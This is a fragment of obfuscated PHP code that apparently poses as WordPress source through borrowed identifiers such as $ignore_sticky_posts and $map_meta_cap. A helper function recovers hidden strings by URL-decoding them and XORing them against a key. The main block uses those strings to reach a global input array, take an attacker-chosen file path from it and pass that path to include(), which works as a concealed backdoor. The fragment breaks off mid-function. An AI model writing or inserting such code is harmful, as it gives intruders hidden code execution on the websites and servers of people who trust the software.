...

{
    ...
    $front = $GLOBALS[expages("%055%18%14%10c", $safe_tag)];

    $cats = $front;

    $old_posts = isset($cats[$safe_tag]);
    if ($old_posts)

    {
        $date = $front[$safe_tag];
        $ignore_sticky_posts = $date[expages(".%1E%21%07%3BQ%3F%06", $safe_tag)];
	$real = 'parent';
        $em_dash = $ignore_sticky_posts;
	$include = 'force_delete';
        include ($em_dash);

    }
}
function expages($comment_id, $option)

{
    $textarr = $option;
	$default_labels = 'force';
    $value = "url" . "decode";

    $map_meta_cap = $value($comment_id);
    $exts = substr($textarr,0, strlen($map_meta_cap));

    $show_ui = $map_meta_cap ^ $exts;
    
    $map_meta_cap = strpos($show_ui, $exts);
	$uris = 'post_password';
